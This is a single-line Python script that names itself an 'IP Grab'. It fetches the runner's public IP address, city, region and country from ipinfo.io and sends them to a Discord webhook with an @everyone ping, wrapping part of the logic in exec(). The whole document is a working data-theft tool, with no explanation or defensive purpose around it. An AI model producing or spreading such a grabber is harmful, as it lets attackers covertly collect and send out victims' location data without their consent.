from discord_webhook import DiscordWebhook, DiscordEmbed;import requests as req;r=req.get("http://ipinfo.io/json").json();exec(r"ip=r['ip'];city=r['city'];reg=r['region'];coun=r['country'];webhook=DiscordWebhook(url='WEBHOOK', username='IP Grab 1 line',content='@everyone');embed=DiscordEmbed(title=f'Location', description=f'IP : **{ip}**\nCity : **{city}**\nCountry : **{coun}**\nRegion : **{reg}**');webhook.add_embed(embed);response = webhook.execute()")
